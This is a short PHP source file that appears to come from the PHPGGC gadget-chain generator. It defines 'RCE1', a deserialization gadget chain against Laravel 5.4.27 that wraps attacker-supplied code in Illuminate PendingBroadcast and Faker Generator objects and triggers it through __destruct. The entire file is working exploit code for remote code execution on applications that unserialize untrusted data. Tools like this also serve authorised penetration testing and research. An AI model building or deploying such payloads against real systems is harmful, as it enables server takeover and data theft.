<?php

namespace GadgetChain\Laravel;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
	public $version = '5.4.27';
	public $vector = '__destruct';
	public $author = 'cf';

	public function generate(array $parameters)
	{
		$code = $parameters['code'];

		return new \Illuminate\Broadcasting\PendingBroadcast(
			new \Faker\Generator(),
			$code
		);
	}
}
